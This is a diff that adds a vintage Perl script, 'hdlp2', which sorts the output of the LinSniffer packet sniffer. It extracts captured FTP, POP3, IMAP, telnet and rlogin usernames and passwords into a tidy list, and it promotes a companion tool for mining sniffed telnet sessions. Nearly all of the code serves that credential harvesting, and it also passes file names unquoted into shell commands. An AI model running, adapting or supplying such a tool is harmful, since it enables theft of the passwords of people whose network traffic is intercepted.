@@ -1,0 +1,306 @@
+#!/usr/bin/perl
+
+# hdlp2 version 2.05 by JaV <jav@xy.org>
+# Use this software in responsible manner, ie: not for any illegal actions etc.
+# The author can NOT be held responsible for what people do with the script.
+
+# (c) 1997-1998 JaV <jav@xy.org>
+# All rights reserved.
+# However, you may improve, rewrite etc. - but give credit. (and give me a copy :) )
+
+
+# Sorts the output from LinSniffer 0.666 by hubmle of rhino9 (which is 
+# based on LinSniffer 0.03 [BETA] by Mike Edulla <medulla@infosoc.com> )
+
+# Check out hdgy2 (for linsniffer 0.666) by JaV.			<= A	
+# It tires to retrive "interesting" things that users 		<= D
+# did in there telnet sessions!								<= V
+# It saves you the trouble from looking through the file	<= E
+# all by yourself ;)										<= R
+# If you have any suggestions for it, please mail me.		<= T
+# (note: hdgy2 will soon be released, I think..)
+
+
+
+
+# Version history:
+#
+# vers.		date	who						what
+###############################################################################
+# 2.01		980510	JaV <jav@xy.org>		> Added support for login (513)
+#											> Rewrote some stuff..
+#											> Should work a little better now..
+#											> Note: args must be passed as -abc,
+#											  or it won't work (ye, ugly..)
+#
+# 2.02		980513	JaV <jav@xy.org>		> Bah, stupid bug in Spaces()..
+# 2.03		980530	JaV <jav@xy.org>		> Changed some things in DoFaP(), so
+#											  that if we get a USER where we except
+#											  a PASS, we'll just try again.. (People 
+#											  say that it happends quite often that 
+#											  they get double USER entries for example..)
+#											> I'm thinking of removing the ddoouubbllee-char
+#											  thing since it might as well echo as dodoubublele..,
+#											  what do you think?
+#
+# 2.04		980610	JaV <jav@xy.org>		> Removed the ddoouubbllee-char thing, it's quite
+#											  useless :)
+#											> Changed the way DoTelnet() receives the login,
+#											  the new way is a little slower, but it's safer.
+#											> Rewrote the way ReadLine() works, so it returns
+#											  0 if the line matches /^[-=]{60$/, and exits otherwhise.
+#											  This makes it easier parsing linsniff 666's broken
+#											  output files.. (buggy thing..)
+#											> Changed all `` to qx(). Why? Because I think it looks nicer.
+#
+# 2.05		980615	JaV <jav@xy.org>		> Argh, stupid, annoying, stupid and _STUPID_ bug!
+#											> Added a DEBUG var, to make it easier for me.
+#											> Added origin argument to ReadLine() (shows up when $DEBUG == 1 )
+#											> Fixed alot of other things too, perhaps we're bugfree now?
+#
+#
+# end of version history
+
+$| = 1;
+
+$perl = "/usr/bin/perl";
+# If you don't know where your perl is..
+# $perl = qx( which perl );
+
+# Debug?
+$DEBUG = 0;
+
+PrintUsage() if ( $#ARGV < 0 );
+
+# Yeah, I know what getopts is, but I don't want to use any modules/etc here.
+
+if ( $ARGV[0] =~ /^-/ )
+{
+	if ( $ARGV[0] =~ /z/ )
+	{
+		$dontGuess = 1 if ( $ARGV[0] =~ /d/ );
+		ParseIt();
+	}
+	else
+	{
+		$args .= "d" if ( $ARGV[0] =~ /d/ );
+		
+		StartIt( $ARGV[1], $args );
+	}
+}
+elsif ( $ARGV[0] )
+{
+	StartIt( $ARGV[0] );
+}
+else
+{
+	PrintUsage();
+}
+
+sub StartIt
+{
+	($file, $args) = @_;
+	
+	FileError() unless ( -r "$file" || -e "$file" );
+	
+	PrintHeader();
+	
+	if ( $file =~ /\.gz$/ ) {
+		print qx( zcat $file | $perl $0 -z$args | sort -u );
+	}
+	else {
+		print qx( cat $file | $perl $0 -z$args | sort -u );
+	}
+	
+	PrintFooter();
+}
+
+
+sub PrintUsage
+{
+	print "Usage: $0 [-zd] <inputFile>\n";
+	print "       -z    Read from stdin (disables uniq, sort, header/footer etc!)\n";
+	print "       -d    Don't \"guess\" telnet passwords\n\n";
+	exit(1);
+}
+
+sub ParseIt 
+{
+	# This is quite ugly, but it was the easiest way, with the new
+	# ReadLine() strategy..
+	for (;;)
+	{
+		ReadLine( "main(1)" );
+		# Continue if its not a "start" line.
+		next unless ( ($host, $port) = $line =~ /^Path: \S+ => (\S+) \[(\d+)\]/ );
+		
+		# A line full of "-" x 60 is read in here...
+		# Readline() should return 0, if it doesn't, something is wrong
+		# so we skip this entry..
+		next if ( ReadLine( "main(2)" ) );
+
+		# Read in the next line, this is the first line of the data,
+		# that's why we next; if it's just a lot of dashes/equals signs.
+		#next unless ( ReadLine( "main(3)" ) );
+		
+		if ( $port == 21 || $port == 110 ) { DoFaP(); }
+			elsif ( $port == 143 ) { DoIMAP(); }
+				elsif ( $port == 23 && !$dontGuess ) { DoTelnet(); }
+					elsif ( $port == 513 ) { DoLogin(); }
+						else { DoOthers(); }
+		
+		# Let's reset some variables...
+		$host = $port = $user = $pass = undef;
+	}
+}
+
+sub ReadLine
+{
+	exit(1) unless ( defined( $line = <STDIN> ) );
+	exit(0) if ( $line eq "Exiting...\n" );
+	
+	if ( $DEBUG == 1 )
+	{
+		print "ReadLine( " . ($_[0] or "-") . " ): $line";
+		print "Will return: " . ($line =~ /^[-=]{60}$/ ? "0" : "1" ) . "\n";
+	}
+	return(0) if ( $line =~ /^[-=]{60}$/ );
+	return(1);
+}
+
+sub PrintIt
+{
+	printf( "[%3d]   $host" . Spaces( 27, $host ) . "$user" . Spaces( 15, $user ) . "$pass\n", $port );
+}
+
+# Spaces( toFill, string )
+# Return toFill-length(string) Spaces (' ')
+# Guaranteed to return at least 1 space..
+sub Spaces
+{
+	my( $x ) = $_[0] - length($_[1]);
+	return( " " x ( ($x > 0) ? $x : 1 ) );
+}
+
+# Handle "unknown" servies (or telnet if you ran it with the d-switch)
+sub DoOthers
+{
+	$data .= $line while ( ReadLine( "DoOthers()" ) );
+
+	# Then it can't be very interesting, can it?
+	return(1) unless( $data );
+
+	# Remove the nav-key stuff.
+	# (Hm, there must be a nicer way of getting rid of those, anyone?)
+	$data =~ s/OBOB//mg; 
+	$data =~ s/AHAH//mg;
+	$data =~ s/AHAH//mg;
+	$data =~ s/OAOA//mg;
+	$data =~ s/\[[ABCD]//mg;#]
+	$data =~ s/\[\d~//mg;#]
+
+	chop($data);
+	# Replace the newline chars with ":"
+	$data =~ s/\n/:/mg;
+	return(0) unless ( $data );
+
+	printf( "[%3d]   $host" . Spaces( 27, $host ) . "$data\n", $port );
+}
+
+
+sub DoFaP
+{
+	while ( ReadLine( "DoFaP()" ) )
+	{
+		next if ( lc(substr($line, 0, 4 )) eq "auth" );
+		next unless ( ($cmd, $arg) = $line =~ /(\w+) (.*)/ );
+
+		# Null passwords/usernames, I dunno?! 8)
+		$arg = "<null>" unless( $arg );
+
+		if ( lc($cmd) eq "user" )
+		{
+			$user = $arg;
+		}
+		elsif ( lc($cmd) eq "pass" )
+		{
+			$pass = $arg;
+			PrintIt() if ( $user );
+			return(0);
+		}
+	}
+}
+
+
+# This one handle IMAPs (port 143)
+sub DoIMAP
+{
+	return(0) unless ReadLine( "DoIMAP()" );
+	return(0) unless ( ($user, $pass) = $line =~ /LOGIN (\S+) (\S+)/i );
+	PrintIt();
+}
+
+
+# This one handle the telnets (port 23)
+# Changed strategy in hdlp2, should work..
+sub DoTelnet
+{
+	return(0) unless ReadLine( "DoTelnet()" );
+	# Weird if it failes, but who knows..
+	# (note: I escape everything because I wan't. ok?)
+	if ( ($user) = $line =~ /[\!\'\$\"%\#\&\s]*([^\!\'\$\"%\#\&\s]+)$/ )
+	{
+		return(0) unless ( ReadLine( "DoTelnet()" ) );
+		chop($line);
+
+		# Right now, we just except it to be the passwd
+		# but in future versions, we'll check if it looks much like
+		# the login, and if it does, we'll take the next one instead.
+		# (agrep/ApproxString style.)
+		$pass = $line;
+
+		PrintIt();
+	}
+}
+
+# This one handle the login:s (port 513)
+# (hm, is this the right way?)
+sub DoLogin
+{
+	return(0) unless ( ReadLine( "DoLogin()" ) );
+	chop( $user = $line );
+	return(0) unless ( ReadLine( "DoLogin()" ) );
+	chop( $pass = $line );
+	
+	PrintIt();
+}
+
+
+sub PrintHeader
+{
+	# No, localtime != qx(date).
+	print qx(date);
+	print qx(ls -l $file);
+	print "-" x 70 . "\n";
+}
+
+sub PrintFooter
+{
+	print "-" x 70 . "\n";
+	print qx(date);
+	print "-" x 67 . "EOF\n";
+}
+
+sub FileError
+{
+	print "Error: Cannot find/read \"$file\"\n\n";
+	exit(1);
+}
+
+
+__END__
+stff
+tatvotse
+icmtesnw
+tsonlanc
+tbgwnhgb
